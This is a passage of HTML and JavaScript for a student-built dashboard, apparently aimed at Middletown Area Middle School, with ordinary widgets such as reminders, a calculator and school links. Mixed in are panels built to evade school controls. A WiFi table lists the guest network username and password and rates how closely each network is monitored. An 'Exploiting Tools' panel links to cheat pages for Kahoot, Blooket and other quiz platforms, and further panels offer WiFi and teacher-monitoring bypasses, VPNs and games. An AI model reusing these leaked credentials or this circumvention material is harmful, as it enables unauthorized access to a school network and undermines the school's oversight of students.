                    <option value="YYYY-MM-DD">YYYY-MM-DD (e.g., 2025-08-23)</option>
                    <option value="MMMM DD, YYYY">Month Day, Year (e.g., August 23, 2025)</option>
                </select>
            </div>
            <div class="setting-item">
                <label for="timeFormat">Time Format:</label>
                <select id="timeFormat" onchange="dashboard.setTimeFormat(this.value)">
                    <option value="12hr">12-Hour (HH:MM:SS AM/PM)</option>
                    <option value="24hr">24-Hour (HH:MM:SS)</option>
                </select>
            </div>
        </div>

        <div class="setting-group">
            <h3>Notes Canvas Settings</h3>
            <div class="setting-item">
                <label for="canvasLineColor">Canvas Draw Color:</label>
                <input type="color" id="canvasLineColor" value="#ff914d" onchange="dashboard.setCanvasLineColor(this.value)">
            </div>
            <div class="setting-item">
                <label for="canvasLineSize">Canvas Line Thickness:</label>
                <input type="range" id="canvasLineSize" min="1" max="10" value="2" oninput="dashboard.setCanvasLineSize(this.value)">
                <span id="canvasLineSizeValue">2</span>
            </div>
        </div>
      </div>
      <!-- END SETTINGS PANEL -->

      <!-- REMINDERS PANEL (New) -->
      <div id="remindersPanel" class="info-panel">
        <h2>⏰ Reminder System</h2>
        <input type="text" id="newReminderText" placeholder="Enter new reminder..." style="width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #555; background: var(--input-bg); color: var(--text-color);">
        <input type="datetime-local" id="newReminderDateTime" style="width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #555; background: var(--input-bg); color: var(--text-color);">
        <button class="settings-button" onclick="dashboard.addReminder()" style="width: 100%;">Add Reminder</button>
        <h3>Upcoming Reminders:</h3>
        <ul id="remindersList" style="list-style: none; padding: 0;">
            <!-- Reminders will be loaded here -->
        </ul>
      </div>
      <!-- END REMINDERS PANEL -->

      <!-- TASK MANAGER PANEL (New) -->
      <div id="taskManagerPanel" class="info-panel">
          <h2>✅ Task Manager</h2>
          <input type="text" id="newTaskInput" placeholder="Add a new task..." style="width: calc(100% - 70px); padding: 10px; margin-right: 5px; border-radius: 8px; border: 1px solid #555; background: var(--input-bg); color: var(--text-color);">
          <button class="settings-button" onclick="dashboard.addTask()" style="padding: 10px; width: 60px;">Add</button>
          <ul id="tasksList" style="list-style: none; padding: 0; margin-top: 10px;">
              <!-- Tasks will be loaded here -->
          </ul>
      </div>
      <!-- END TASK MANAGER PANEL -->

      <!-- CALCULATOR PANEL (New) -->
      <div id="calculatorPanel" class="info-panel">
        <h2>🧮 Calculator</h2>
        <div class="calculator-grid">
            <input type="text" id="calcDisplay" value="0" readonly class="calc-display">
            <button onclick="dashboard.calcClear()">C</button>
            <button onclick="dashboard.calcBackspace()">←</button>
            <button onclick="dashboard.calcAppend('/')">/</button>
            <button onclick="dashboard.calcAppend('*')">*</button>
            <button onclick="dashboard.calcAppend('7')">7</button>
            <button onclick="dashboard.calcAppend('8')">8</button>
            <button onclick="dashboard.calcAppend('9')">9</button>
            <button onclick="dashboard.calcAppend('-')">-</button>
            <button onclick="dashboard.calcAppend('4')">4</button>
            <button onclick="dashboard.calcAppend('5')">5</button>
            <button onclick="dashboard.calcAppend('6')">6</button>
            <button onclick="dashboard.calcAppend('+')">+</button>
            <button onclick="dashboard.calcAppend('1')">1</button>
            <button onclick="dashboard.calcAppend('2')">2</button>
            <button onclick="dashboard.calcAppend('3')">3</button>
            <button onclick="dashboard.calcEquals()">=</button>
            <button onclick="dashboard.calcAppend('0')">0</button>
            <button onclick="dashboard.calcAppend('.')">.</button>
        </div>
      </div>
      <!-- END CALCULATOR PANEL -->

      <!-- UNIT CONVERTER PANEL (New) -->
      <div id="unitConverterPanel" class="info-panel">
        <h2>🔄 Unit Converter</h2>
        <div class="unit-convert-section">
            <h3>Length</h3>
            <input type="number" id="lengthInput" placeholder="Value" oninput="dashboard.convertUnits('length')">
            <select id="lengthFromUnit" onchange="dashboard.convertUnits('length')">
                <option value="meters">Meters</option>
                <option value="feet">Feet</option>
                <option value="inches">Inches</option>
                <option value="cm">Centimeters</option>
            </select>
            <span> to </span>
            <select id="lengthToUnit" onchange="dashboard.convertUnits('length')">
                <option value="meters">Meters</option>
                <option value="feet">Feet</option>
                <option value="inches">Inches</option>
                <option value="cm">Centimeters</option>
            </select>
            <p>Result: <span id="lengthResult"></span></p>
        </div>
        <div class="unit-convert-section">
            <h3>Temperature</h3>
            <input type="number" id="tempInput" placeholder="Value" oninput="dashboard.convertUnits('temperature')">
            <select id="tempFromUnit" onchange="dashboard.convertUnits('temperature')">
                <option value="celsius">Celsius</option>
                <option value="fahrenheit">Fahrenheit</option>
                <option value="kelvin">Kelvin</option>
            </select>
            <span> to </span>
            <select id="tempToUnit" onchange="dashboard.convertUnits('temperature')">
                <option value="celsius">Celsius</option>
                <option value="fahrenheit">Fahrenheit</option>
                <option value="kelvin">Kelvin</option>
            </select>
            <p>Result: <span id="tempResult"></span></p>
        </div>
        <div class="unit-convert-section">
            <h3>Weight (Mass)</h3>
            <input type="number" id="weightInput" placeholder="Value" oninput="dashboard.convertUnits('weight')">
            <select id="weightFromUnit" onchange="dashboard.convertUnits('weight')">
                <option value="kilograms">Kilograms</option>
                <option value="pounds">Pounds</option>
                <option value="grams">Grams</option>
            </select>
            <span> to </span>
            <select id="weightToUnit" onchange="dashboard.convertUnits('weight')">
                <option value="kilograms">Kilograms</option>
                <option value="pounds">Pounds</option>
                <option value="grams">Grams</option>
            </select>
            <p>Result: <span id="weightResult"></span></p>
        </div>
      </div>
      <!-- END UNIT CONVERTER PANEL -->

      <!-- WEATHER PANEL (New) -->
      <div id="weatherPanel" class="info-panel">
        <h2>☀️ Local Weather</h2>
        <div class="weather-display">
            <p>Location: Middletown, PA</p>
            <p>Temperature: <span id="currentTemp">22°C / 72°F</span></p>
            <p>Condition: <span id="weatherCondition">Partly Cloudy 🌤️</span></p>
            <p>Humidity: <span id="weatherHumidity">65%</span></p>
            <p>Wind Speed: <span id="weatherWind">15 km/h</span></p>
            <button class="settings-button" onclick="dashboard.updateWeather()">Refresh Weather (Mock)</button>
            <p class="small-text"><i>(Weather data is simulated for demonstration)</i></p>
        </div>
      </div>
      <!-- END WEATHER PANEL -->

      <!-- PROFILE MANAGER PANEL (New) -->
      <div id="profilePanel" class="info-panel">
          <h2>👤 User Profile</h2>
          <div class="profile-info-grid">
              <div class="profile-item">
                  <span class="profile-label">Username:</span>
                  <span id="profileUsernameDisplay">Beta.user</span>
              </div>
              <div class="profile-item">
                  <span class="profile-label">User ID:</span>
                  <span id="profileUserIDDisplay">281573</span>
              </div>
              <div class="profile-item">
                  <span class="profile-label">Display Name:</span>
                  <input type="text" id="profileDisplayName" value="Beta User" style="background: var(--input-bg); color: var(--text-color); border: 1px solid #555; padding: 8px; border-radius: 5px;">
                  <button class="settings-button" onclick="dashboard.saveProfile('displayName')">Save</button>
              </div>
              <div class="profile-item">
                  <span class="profile-label">Email:</span>
                  <input type="email" id="profileEmail" value="beta.user@example.com" style="background: var(--input-bg); color: var(--text-color); border: 1px solid #555; padding: 8px; border-radius: 5px;">
                  <button class="settings-button" onclick="dashboard.saveProfile('email')">Save</button>
              </div>
              <div class="profile-item">
                  <span class="profile-label">Account Status:</span>
                  <span>Active (Free Tier)</span>
                  <button class="settings-button">Upgrade Account (Mock)</button>
              </div>
              <div class="profile-item">
                  <span class="profile-label">Security Settings:</span>
                  <button class="settings-button" onclick="dashboard.showChangePasswordDialog()">Change Password (Mock)</button>
              </div>
          </div>
          <p class="coming-soon" style="background-color: transparent;">More profile customization and features coming soon!</p>
      </div>
      <!-- END PROFILE MANAGER PANEL -->

      <!-- Existing Panels (updated to use variables and notification system) -->
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>📡 School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div>Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div>Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>📱 School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions', this)">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses', this)">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <p>Coming soon</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>📘 Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank" onclick="dashboard.notifyClick('Elementary Handbook (Jan 2025)')">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank" onclick="dashboard.notifyClick('Secondary Student Handbook (Jan 2025)')">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank" onclick="dashboard.notifyClick('District Handbook')">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank" onclick="dashboard.notifyClick('RA Academy Handbook (Jan 2025)')">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank" onclick="dashboard.notifyClick('Virtual Learning Plan (2024-2025)')">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank" onclick="dashboard.notifyClick('Dress Code (2024-2025)')">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>🏫 School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>🌐 Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank" onclick="dashboard.notifyClick('RaiderWeb')">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank" onclick="dashboard.notifyClick('Canvas Login')">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank" onclick="dashboard.notifyClick('Care Solace')">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank" onclick="dashboard.notifyClick('Clever Login')">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank" onclick="dashboard.notifyClick('EasyBridge')">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank" onclick="dashboard.notifyClick('FitnessGram')">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank" onclick="dashboard.notifyClick('Hazing Reporting')">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank" onclick="dashboard.notifyClick('MAHS Announcements')">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank" onclick="dashboard.notifyClick('Naviance')">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank" onclick="dashboard.notifyClick('Destiny Library')">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank" onclick="dashboard.notifyClick('PowerSchool')">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank" onclick="dashboard.notifyClick('Scholastic')">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank" onclick="dashboard.notifyClick('Safe2Say')">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank" onclick="dashboard.notifyClick('Gmail')">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank" onclick="dashboard.notifyClick('Balfour')">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank" onclick="dashboard.notifyClick('LinkIt!')">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>👩‍🏫 Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank" onclick="dashboard.notifyClick('Acadience Learning')">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank" onclick="dashboard.notifyClick('AIMSweb Plus')">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank" onclick="dashboard.notifyClick('ERP Linq')">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank" onclick="dashboard.notifyClick('Barracuda')">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank" onclick="dashboard.notifyClick('Buy Guernsey')">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank" onclick="dashboard.notifyClick('Canvas (Teacher)')">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank" onclick="dashboard.notifyClick('Care Solace')">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank" onclick="dashboard.notifyClick('Clever (Teacher)')">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank" onclick="dashboard.notifyClick('Discovery Education')">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank" onclick="dashboard.notifyClick('EasyBridge (Teacher)')">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank" onclick="dashboard.notifyClick('FMX')">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank" onclick="dashboard.notifyClick('FitnessGram')">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank" onclick="dashboard.notifyClick('Frontline')">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank" onclick="dashboard.notifyClick('LinkIt! (Teacher)')">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank" onclick="dashboard.notifyClick('Naviance')">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank" onclick="dashboard.notifyClick('Destiny Library')">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank" onclick="dashboard.notifyClick('PA eTEP')">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank" onclick="dashboard.notifyClick('PowerSchool (Teacher)')">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank" onclick="dashboard.notifyClick('Scholastic')">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank" onclick="dashboard.notifyClick('SchoolMessenger')">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank" onclick="dashboard.notifyClick('PDE SAS')">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank" onclick="dashboard.notifyClick('PBIS Apps')">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank" onclick="dashboard.notifyClick('HappyFox')">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank" onclick="dashboard.notifyClick('SafeSchools')">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank" onclick="dashboard.notifyClick('Office 365')">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>📞 School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>📷 School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>🏫 School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>🧨 Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank" onclick="dashboard.notifyClick('Blooket Exploit')">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/kahoot-exploit" target="_blank" onclick="dashboard.notifyClick('Kahoot Exploit')">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/gimkit-exploit" target="_blank" onclick="dashboard.notifyClick('Gimkit Exploit')">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/quizlet-exploit" target="_blank" onclick="dashboard.notifyClick('Quizlet Exploit')">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/quizzes-exploit" target="_blank" onclick="dashboard.notifyClick('Quizzes Exploit')">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/quills-exploit" target="_blank" onclick="dashboard.notifyClick('Quills Exploit')">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/edpuzzle-exploit" target="_blank" onclick="dashboard.notifyClick('Edpuzzle Exploit')">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/nearpod-exploit" target="_blank" onclick="dashboard.notifyClick('Nearpod Exploit')">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>🚪 Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom', this)">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi', this)">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring', this)">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1', this)">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming2', this)">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3', this)">Coming Soon</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming1Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming2Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming3Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>🔐 VPN Websites</h2>
        <div class="links-list">
          <a href="https://protonvpn.com/" target="_blank" onclick="dashboard.notifyClick('ProtonVPN')">ProtonVPN</a>
          <a href="https://www.tunnelbear.com/" target="_blank" onclick="dashboard.notifyClick('TunnelBear')">TunnelBear</a>
          <a href="https://windscribe.com/" target="_blank" onclick="dashboard.notifyClick('Windscribe')">Windscribe</a>
          <a href="https://www.privadovpn.com/" target="_blank" onclick="dashboard.notifyClick('PrivadoVPN')">PrivadoVPN</a>
          <a href="https://hide.me/" target="_blank" onclick="dashboard.notifyClick('Hide.me VPN')">Hide.me VPN</a>
          <a href="https://www.hotspotshield.com/" target="_blank" onclick="dashboard.notifyClick('Hotspot Shield')">Hotspot Shield</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>🎮 Gaming Websites</h2>
        <div class="links-list">
          <a href="https://www.miniclip.com" target="_blank" onclick="dashboard.notifyClick('Miniclip')">Miniclip</a>
          <a href="https://kbhgames.com/" target="_blank" onclick="dashboard.notifyClick('Kbh Games')">Kbh Games</a>
          <a href="https://poki.com/" target="_blank" onclick="dashboard.notifyClick('Poki')">Poki</a>
          <a href="https://www.friv.com/" target="_blank" onclick="dashboard.notifyClick('Friv')">Friv</a>
          <a href="https://www.addictinggames.com/" target="_blank" onclick="dashboard.notifyClick('Addicting Games')">Addicting Games</a>
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>🎵 Music Websites</h2>
        <div class="links-list">
          <a href="https://www.youtube.com/music" target="_blank" onclick="dashboard.notifyClick('YouTube Music')">YouTube Music</a>
          <a href="https://open.spotify.com/" target="_blank" onclick="dashboard.notifyClick('Spotify Web Player')">Spotify Web Player</a>
          <a href="https://music.apple.com/" target="_blank" onclick="dashboard.notifyClick('Apple Music Web Player')">Apple Music Web Player</a>
          <a href="https://soundcloud.com/" target="_blank" onclick="dashboard.notifyClick('SoundCloud')">SoundCloud</a>
          <a href="https://bandcamp.com/" target="_blank" onclick="dashboard.notifyClick('Bandcamp')">Bandcamp</a>
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>🎹 Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:

• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.
Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.
General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>
    </div>

    <div id="canvasContainer">
      <h2>🖌️ Notes Canvas</h2>
      <canvas id="notesCanvas" width="800" height="600"></canvas> <!-- Increased size -->
      <div id="canvasControls">
        <button id="clearCanvasBtn">Clear Canvas</button>
        <button id="closeCanvasBtn">Close Notes</button>
        <label for="canvasLineColorPicker" style="margin-left: 10px; color: var(--text-color);">Color:</label>
        <input type="color" id="canvasLineColorPicker" value="#ff914d" onchange="dashboard.setCanvasLineColor(this.value)" style="vertical-align: middle;">
        <label for="canvasLineSizeSlider" style="margin-left: 10px; color: var(--text-color);">Thickness:</label>
        <input type="range" id="canvasLineSizeSlider" min="1" max="10" value="2" oninput="dashboard.setCanvasLineSize(this.value); document.getElementById('canvasLineSizeValueNotes').innerText = this.value" style="vertical-align: middle;">
        <span id="canvasLineSizeValueNotes" style="color: var(--text-color);">2</span>
      </div>
    </div>
  </div>

  <script>
    // Global state for notifications
    let enableNotifications = true;
    let notificationDuration = 3; // seconds

    // Dashboard functionality object
    const dashboard = {
      // Internal state
      sessionSeconds: 0,
      zoomLevel: 1,
      zoomStep: 0.1,
      minZoom: 0.5,
      maxZoom: 2,
      dateFormat: 'MMMM DD, YYYY',
      timeFormat: '12hr',
      currentCanvasColor: '#ff914d',
      currentCanvasSize: 2,
      animatePanels: true, // Default to animated panels

      // Initialize all dashboard functionality
      init: function() {
        this.loadSettings(); // Load saved settings first
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons();
        this.initCanvas();
        this.initPanels();
        this.initReminders(); // Initialize Reminder system
        this.initTasks(); // Initialize Task Manager
        this.setupGeneralEventListeners(); // For logging button clicks
      },
      
      // Notify function for button clicks
      notifyClick: function(message, duration = notificationDuration) {
          if (!enableNotifications) return;
          const container = document.getElementById('notification-toast-container');
